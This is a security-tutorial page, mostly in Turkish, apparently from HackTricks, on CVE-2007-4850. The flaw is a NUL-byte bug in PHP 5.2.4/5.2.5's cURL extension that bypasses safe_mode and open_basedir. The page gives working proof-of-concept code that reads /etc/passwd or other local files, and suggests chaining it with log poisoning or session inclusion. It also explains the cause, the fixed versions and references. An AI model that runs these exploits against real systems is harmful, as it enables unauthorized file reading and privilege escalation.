# PHP 5.2.4 and 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

Bu sayfa, belirli PHP 5.2.x build'lerinde cURL uzantısını kullanarak PHP safe_mode/open_basedir kontrollerini atlatmak için CTF'lerde/yerel-legacy-kurulumlarda hâlâ faydalı olabilen eski bir hileyi belgeliyor.

- Etkilenenler: PHP 5.2.4 ve 5.2.5, ext/curl etkin.
- Etki: safe_mode veya open_basedir kısıtlamalarına rağmen herhangi bir yerel dosyayı okuma (doğrudan kod çalıştırma yok).
- ID: CVE-2007-4850.

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## One-liner PoC

Eğer safe_mode veya open_basedir aktifse ve cURL etkinse, aşağıdaki komut mevcut betiğin içeriğini döndürecektir:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## Daha açık PoC (keyfi dosya okuma)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
Notlar:
- Gerçek bir NUL byte eklemek için çift tırnak veya chr(0) kullanın. Percent-encoding (%00) güvenilir çalışmaz.
- Bu bir dosya okuma primitive'idir. Mümkünse daha fazla yetki yükseltme için diğer primitive'lerle (log poisoning, session file inclusion, vb.) birleştirin.

## Bunun neden çalıştığı (kısa)

Zafiyet, PHP 5.2.4/5.2.5'in ext/curl içinde file:// URL'leri için safe_mode/open_basedir kontrollerini nasıl yaptığıyla ilgilidir. Kontrol URL'yi ayrıştırdı ve bir yol bileşenini doğruladı, ancak NUL-byte işleme nedeniyle doğrulayıcı libcurl tarafından gerçekte kullanılan dizgeden farklı bir dizgeyi doğruladı. Pratikte, doğrulayıcı NUL'den sonraki yolu onaylayabilirdi; oysa libcurl konteyner olarak NUL'den öncesini URL olarak kullanıyordu; bu da NUL byte'tan sonra yerleştirilen dosyanın okunmasına yol açan bir bypass'a izin veriyordu. Ayrıntılar için orijinal analize ve curl/interface.c içindeki etkilenen makroya bakın. [CVE-2007-4850].

## Kısıtlar ve düzeltmeler

- ext/curl içindeki ayrıştırma/doğrulamayı düzelterek sonraki 5.2.x sürümlerinde (ör. dağıtımlarda 5.2.6'ya yamalanmış) giderildi.
- Sadece çok eski PHP dağıtımlarını etkiler; safe_mode PHP 5.4'te kaldırıldı ve modern build'ler bu davranışı göstermez.

## Ayrıca bakınız

Diğer disable_functions/open_basedir bypass'ları ve modern teknikler burada toplanmıştır:

{{#ref}}
README.md
{{#endref}}



## Referanslar

- Ubuntu CVE kaydı, patch yönlendirmeleri ve etkilenen sürümler: https://ubuntu.com/security/CVE-2007-4850
- Kod bağlamı içeren teknik yazı (cxsecurity): http://cxsecurity.com/issue/WLB-2008010060
{{#include ../../../../banners/hacktricks-training.md}}
